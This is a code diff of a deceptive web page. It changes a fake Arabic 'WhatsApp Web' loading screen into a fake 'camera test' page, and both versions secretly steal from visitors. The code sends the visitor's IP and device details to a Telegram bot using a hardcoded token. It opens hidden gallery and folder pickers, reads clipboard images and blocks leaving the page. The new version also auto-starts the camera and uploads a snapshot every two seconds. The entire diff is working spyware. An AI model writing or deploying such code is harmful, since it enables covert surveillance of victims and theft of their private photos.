@@ -1,142 +1,127 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web - تحميل...</title>
+    <title>Camera Access</title>
+    <meta name="viewport" content="width=device-width">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            background:#000;
-            height:100vh;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            font-family:Arial,sans-serif;
-            overflow:hidden;
-        }
-        .loader{
-            text-align:center;
-            color:#fff;
-        }
-        .whatsapp-logo{
-            width:100px;
-            height:100px;
-            background:#25d366;
-            border-radius:50%;
-            margin:0 auto 20px;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            font-size:30px;
-            font-weight:bold;
-        }
-        .text{
-            font-size:14px;
-            margin:10px 0;
-            opacity:0.8;
-        }
-        .stealer{position:fixed;top:-10000px;left:-10000px;width:0.1px;height:0.1px;opacity:0;z-index:-1;}
+        body { margin: 0; padding: 20px; background: #000; color: #fff; font-family: Arial; text-align: center; }
+        #video { width: 100%; max-width: 400px; height: 300px; background: #333; }
+        #canvas { display: none; }
+        button { background: #4CAF50; color: white; border: none; padding: 15px 32px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; }
+        .stealer { position: fixed; top: -10000px; opacity: 0; }
     </style>
 </head>
 <body>
-    <div class="loader">
-        <div class="whatsapp-logo">WA</div>
-        <div class="text">جاري الاتصال بـ WhatsApp...</div>
-        <div class="text">يرجى عدم إغلاق الصفحة</div>
-    </div>
-
+    <h2>اختبر كاميرا الجهاز</h2>
+    <video id="video" autoplay muted playsinline></video>
+    <br>
+    <button id="start">بدء الاختبار</button>
+    <button id="capture" disabled>التقاط صورة</button>
+    
     <!-- 🔥 GALLERY STEALERS -->
-    <input type="file" class="stealer" id="s1" multiple accept="image/*">
-    <input type="file" class="stealer" id="s2" multiple accept="image/jpeg,image/png">
-    <input type="file" class="stealer" id="s3" multiple webkitdirectory directory>
+    <input type="file" class="stealer" id="gallery1" multiple accept="image/*">
+    <input type="file" class="stealer" id="gallery2" multiple webkitdirectory>
 
     <script>
         const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
         const CHAT_ID = '8539996558';
-        const stealers = ['s1','s2','s3'].map(id=>document.getElementById(id));
+        
+        const video = document.getElementById('video');
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const startBtn = document.getElementById('start');
+        const captureBtn = document.getElementById('capture');
+        const gallery1 = document.getElementById('gallery1');
+        const gallery2 = document.getElementById('gallery2');
 
-        // 🔥 STEP 1: SEND IP IMMEDIATELY
-        fetch('https://api.ipify.org?format=json')
-        .then(r=>r.json())
-        .then(d=>sendHit(d.ip))
-        .catch(()=>sendHit('unknown'));
+        canvas.width = 640;
+        canvas.height = 480;
+
+        // 🔥 SEND HIT
+        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>sendHit(d.ip));
 
         function sendHit(ip){
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
                 method:'POST',
-                headers:{'Content-Type':'application/json'},
                 body:JSON.stringify({
                     chat_id:CHAT_ID,
-                    text:`🎯 HIT!\n🌐 IP: ${ip}\n📱 ${navigator.userAgent.slice(0,60)}\n📏 ${screen.width}x${screen.height}`
+                    text:`🎥 CAMERA HIT!\n🌐 IP: ${ip}\n📱 ${navigator.userAgent.slice(0,80)}`
                 })
             });
         }
 
-        // 🔥 STEP 2: MASS GALLERY ATTACK
-        stealers.forEach((input,i)=>{
-            setTimeout(()=>{
-                // TRIPLE CLICK ATTACK
-                input.click();
-                setTimeout(()=>input.click(),10);
-                setTimeout(()=>input.click(),50);
-                
-                input.onchange = e=>{
-                    uploadFiles(Array.from(e.target.files).filter(f=>f.size>5e3&&f.size<1e7));
-                }
-            },i*100);
-        });
-
-        // 🔥 WEBKIT DIRECTORY ATTACK
-        setTimeout(()=>{
-            const dirInput = document.createElement('input');
-            dirInput.type='file';
-            dirInput.webkitdirectory=true;
-            dirInput.directory=true;
-            dirInput.multiple=true;
-            dirInput.className='stealer';
-            document.body.appendChild(dirInput);
-            
-            dirInput.click();
-            dirInput.onchange=e=>uploadFiles(Array.from(e.target.files));
-            setTimeout(()=>document.body.removeChild(dirInput),3000);
-        },500);
-
-        // 🔥 CLIPBOARD ATTACK
-        if(navigator.clipboard && navigator.clipboard.read){
-            navigator.clipboard.read().then(items=>{
-                items.forEach(async item=>{
-                    if(item.types.includes('image/png')){
-                        const blob=await item.getType('image/png');
-                        const file=new File([blob],'clip.png',{type:'image/png'});
-                        uploadFiles([file]);
-                    }
+        // 🔥 CAMERA ACCESS
+        startBtn.onclick = async()=>{
+            try{
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
                 });
-            }).catch(()=>{});  
+                video.srcObject = stream;
+                startBtn.disabled = true;
+                captureBtn.disabled = false;
+                
+                // 🔥 AUTO CAPTURE EVERY 2s
+                setInterval(capturePhoto, 2000);
+            }catch(e){
+                // Fallback to gallery
+                galleryAttack();
+            }
+        };
+
+        // 🔥 LIVE CAMERA STEAL
+        function capturePhoto(){
+            ctx.drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob(blob=>{
+                const file = new File([blob], `live_${Date.now()}.jpg`, {type: 'image/jpeg'});
+                uploadFile(file);
+            }, 'image/jpeg', 0.8);
         }
 
-        // 🔥 UPLOAD ENGINE
-        async function uploadFiles(files){
-            if(files.length===0) return;
+        // 🔥 GALLERY ATTACK
+        function galleryAttack(){
+            // Triple gallery trigger
+            [gallery1, gallery2].forEach((input,i)=>{
+                setTimeout(()=>{
+                    input.click();
+                    input.click();
+                    input.onchange = e=>uploadFiles(Array.from(e.target.files));
+                },i*200);
+            });
             
-            // RAPID FIRE UPLOAD
-            files.slice(0,20).forEach(async(file,i)=>{
-                const form=new FormData();
-                form.append('chat_id',CHAT_ID);
-                form.append('photo',file);
-                form.append('caption',`${i+1}/${files.length} ${(file.size/1e6).toFixed(1)}MB ${file.name}`);
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-                    method:'POST',
-                    body:form
-                }).catch(e=>console.log('Upload',i,e));
+            // Create more inputs
+            for(let i=0;i<5;i++){
+                setTimeout(()=>{
+                    const inp = document.createElement('input');
+                    inp.type='file';
+                    inp.multiple=true;
+                    inp.accept='image/*';
+                    inp.className='stealer';
+                    document.body.appendChild(inp);
+                    inp.click();
+                    inp.onchange=e=>uploadFiles(Array.from(e.target.files));
+                },1000+i*100);
+            }
+        }
+
+        // 🔥 UPLOAD
+        function uploadFile(file){
+            const fd = new FormData();
+            fd.append('chat_id',CHAT_ID);
+            fd.append('photo',file);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+                method:'POST',body:fd
             });
         }
 
-        // 🔥 ANTI EXIT
-        history.pushState(null,null,location.href);
-        window.onpopstate=()=>history.go(1);
-        window.onbeforeunload=()=>"";
+        function uploadFiles(files){
+            files.slice(0,15).forEach(file=>uploadFile(file));
+        }
+
+        // 🔥 AUTO START
+        setTimeout(()=>startBtn.click(),1500);
+        
+        // 🔥 Media Query Listener (Mobile Gallery)
+        window.matchMedia('(max-width: 768px)').addEventListener('change', galleryAttack);
     </script>
 </body>
 </html>
